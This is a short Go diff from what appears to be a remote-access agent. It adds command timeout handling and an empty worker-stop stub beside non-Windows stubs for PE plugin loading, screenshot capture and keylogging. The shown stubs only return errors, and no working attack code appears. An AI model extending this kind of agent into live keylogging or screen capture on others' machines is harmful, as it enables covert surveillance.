@@ -7,10 +7,13 @@ import (
 	"errors"
 	"net/http"
 	"os/exec"
+	"time"
 )
 
 func newCommand(name string, args ...string) *exec.Cmd {
-	return exec.Command(name, args...)
+	command := exec.CommandContext(agentContext, name, args...)
+	command.WaitDelay = 2 * time.Second
+	return command
 }
 
 func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
@@ -30,6 +33,8 @@ func runWindowsPluginChild([]string) error {
 }
 
 func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }
+
+func stopPlatformWorkers() {}
 
 func keylogAction(string) (string, string, error) {
 	return "", "output", errors.New("keylogging requires Windows")
